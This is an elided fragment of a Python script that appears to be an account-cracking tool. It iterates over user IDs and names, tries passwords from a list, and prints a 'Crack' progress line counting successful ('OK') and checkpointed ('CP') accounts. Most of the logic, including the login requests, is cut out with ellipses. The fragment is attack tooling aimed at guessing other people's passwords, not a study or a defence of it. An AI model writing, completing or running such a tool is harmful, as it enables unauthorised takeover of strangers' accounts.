...
def bapi(user):
	...
	global loop, token
	sys.stdout.write(
		"\r\033[1;93m\033[1;92mCrack \033[1;91m]\033[1;92m %s/%s -> OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	uid, name = user.split("<=>")
	if len(name)>=6:
...
def manual():
	...
	def main(user):
		global loop, token
		sys.stdout.write(
			"\r\033[0;92m[\033[0;96mCrack \033[0;92m]\033[0;96m %s/%s -> OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
		); sys.stdout.flush()
		uid, name = user.split("<=>")
		try:
			for pw in asu:
